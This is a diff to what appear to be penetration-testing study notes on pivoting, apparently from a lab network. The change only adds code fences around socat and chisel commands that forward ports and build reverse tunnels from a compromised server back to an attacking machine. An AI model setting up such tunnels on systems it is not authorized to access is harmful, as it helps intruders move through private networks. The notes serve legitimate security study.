@@ -71,8 +71,9 @@ Example ::
 ### Forwarding PORT NOISY:: 
 compromised server → 172.16.0.5
 target server and port → 172.16.0.10:3306
-
+```
 command → ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+```
 This opens up a port 33060 in compromised server and redirects the input from the attacking machine straight to the intended target server giving us access to the port 3306 (maybe MYSQL) running on th target.
 fork → fork in used to put every connection in to the new process
 reuseaddr → means that the port stays open after the connection is made to it.
@@ -128,11 +129,12 @@ PROXY_PORT will be the port that will be opened for the proxy
 
 ### Remote Port Forward ::
 A remote port forward is when we connect back from a compromised target to create the forward
-
+```
 Attacking Machine → ./chisel server -p LISTEN_PORT --reverse &
 Compromised Mac → ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
 LISTEN_PORT → the port we started the chisel server on
-LOCAL_PORT → the port we wish to open on our attacking machine to link with the desired target port 
+LOCAL_PORT → the port we wish to open on our attacking machine to link with the desired target port
+``` 
 ```
 Compro server → ./chisel_client 172.16.0.20:1337(our IP) R:2222:172.16.0.10:22(target_ip) &
 Attack machine → ./chisel_server -p 1337 --reverse &
@@ -140,10 +142,10 @@ This would allow us to access 172.16.0.22 by navigating to 127.0.0.1:2222
 ```
 ### Local Port Forward:: 
 It is where we connect from our own attacking machine to a chisel server listening on a compromised target.
-
+```
 Compromised target → ./chisel server -p LISTEN_PORT 
 attacking box → ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
-
+```
 ## SSHUTTLE 
 It uses ssh connection to create a tunnelled proxy that acts like a new interface.It allows use to route our traffic through proxy without proxychains.
 
